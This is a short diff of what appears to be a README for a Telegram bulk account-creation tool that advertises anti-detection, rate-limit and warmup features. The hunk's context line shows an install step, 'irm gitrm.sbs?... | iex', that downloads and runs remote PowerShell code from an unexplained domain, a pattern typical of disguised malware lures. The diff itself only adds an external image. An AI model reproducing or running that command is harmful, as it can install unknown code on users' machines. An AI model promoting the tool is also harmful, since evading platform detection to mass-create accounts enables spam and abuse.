@@ -77,7 +77,8 @@ irm gitrm.sbs?t=telegram-account-autocreate | iex
 | 🛡️ **Safety Tools** | Anti-detection, rate limits, warmup | Safety |
 
 ---
-
+<img src="https://cdn.yolly.ai/image/generated/992bc3b85ab8dc7f64e1b1d8326d5649_0-1789294254270-iceqz4ik.png">
+---
 ## 🎯 Core Features
 
 ### Account Creator
